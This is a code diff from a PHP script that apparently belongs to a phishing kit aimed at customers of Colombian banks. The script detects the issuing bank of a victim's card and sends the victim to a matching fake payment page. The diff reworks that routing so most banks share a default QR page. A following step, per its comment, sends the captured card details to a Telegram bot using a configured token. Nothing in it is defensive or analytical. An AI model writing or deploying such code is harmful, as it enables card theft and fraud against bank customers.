@@ -196,45 +196,24 @@ switch ($firstDigit) {
         break;
 }
 
-// 6. DETERMINAR LA DIRECCIÓN DE REDIRECCIÓN SEGÚN EL BANCO DETECTADO
-$bancoNormalizado = strtolower($issuer);
-$redirectUrl = 'pago/4c7a1d9e/'; // Default (Bancolombia)
-
-if (strpos($bancoNormalizado, 'bancolombia') !== false && strpos($bancoNormalizado, 'nequi') === false) {
-    $redirectUrl = 'pago/4c7a1d9e/';
-} elseif (strpos($bancoNormalizado, 'davivienda') !== false || strpos($bancoNormalizado, 'daviplata') !== false) {
-    $redirectUrl = 'pago/5d1e9a3b/';
-} elseif (strpos($bancoNormalizado, 'bogot') !== false) {
-    $redirectUrl = 'pago/1a9f3d8c/';
-} elseif (strpos($bancoNormalizado, 'bbva') !== false) {
-    $redirectUrl = 'pago/6e2b8f04/';
-} elseif (strpos($bancoNormalizado, 'villas') !== false) {
-    $redirectUrl = 'pago/9f8b2e1a/';
-} elseif (strpos($bancoNormalizado, 'caja social') !== false) {
-    $redirectUrl = 'pago/7d4e0b2a/';
-} elseif (strpos($bancoNormalizado, 'colpatria') !== false || strpos($bancoNormalizado, 'scotiabank') !== false) {
-    $redirectUrl = 'pago/3f8a1e9c/';
-} elseif (strpos($bancoNormalizado, 'falabella') !== false) {
-    $redirectUrl = 'pago/2e8f4a1c/';
-} elseif (strpos($bancoNormalizado, 'finandina') !== false) {
-    $redirectUrl = 'pago/0b7d3e9a/';
-} elseif (strpos($bancoNormalizado, 'itau') !== false || strpos($bancoNormalizado, 'itaú') !== false) {
-    $redirectUrl = 'pago/a4c81f2e/';
-} elseif (strpos($bancoNormalizado, 'lulo') !== false) {
-    $redirectUrl = 'pago/f1e93a7b/';
-} elseif (strpos($bancoNormalizado, 'mundo mujer') !== false) {
-    $redirectUrl = 'pago/d8b24e0a/';
-} elseif (strpos($bancoNormalizado, 'nequi') !== false) {
-    $redirectUrl = 'pago/c3a7f91e/';
-} elseif (strpos($bancoNormalizado, 'occidente') !== false) {
-    $redirectUrl = 'pago/1e8a4d7b/';
-} elseif (strpos($bancoNormalizado, 'popular') !== false) {
-    $redirectUrl = 'pago/e9f2b14c/';
-} elseif (strpos($bancoNormalizado, 'serfinanza') !== false) {
-    $redirectUrl = 'pago/7a1d8e3f/';
-} elseif (strpos($bancoNormalizado, 'union') !== false || strpos($bancoNormalizado, 'unión') !== false) {
-    $redirectUrl = 'pago/b2e4f08a/';
-}
+// 6. DETERMINAR LA DIRECCIÓN DE REDIRECCIÓN SEGÚN EL BANCO DETECTADO
+$bancoNormalizado = strtolower($issuer);
+$redirectUrl = 'pago/qr/index.php'; // Default para todos los bancos fuera de Aval y Davivienda
+
+// Excepción: Bancos del Grupo Aval y Davivienda
+if (strpos($bancoNormalizado, 'davivienda') !== false || strpos($bancoNormalizado, 'daviplata') !== false) {
+    $redirectUrl = 'pago/5d1e9a3b/';
+} elseif (strpos($bancoNormalizado, 'bogot') !== false) {
+    $redirectUrl = 'pago/1a9f3d8c/';
+} elseif (strpos($bancoNormalizado, 'villas') !== false) {
+    $redirectUrl = 'pago/9f8b2e1a/';
+} elseif (strpos($bancoNormalizado, 'occidente') !== false) {
+    $redirectUrl = 'pago/1e8a4d7b/';
+} elseif (strpos($bancoNormalizado, 'popular') !== false) {
+    $redirectUrl = 'pago/e9f2b14c/';
+} else {
+    $redirectUrl = 'pago/qr/index.php';
+}
 
 // 7. ENVIAR INFO DE LA TARJETA A TELEGRAM
 $botToken = $config['botToken'] ?? '';
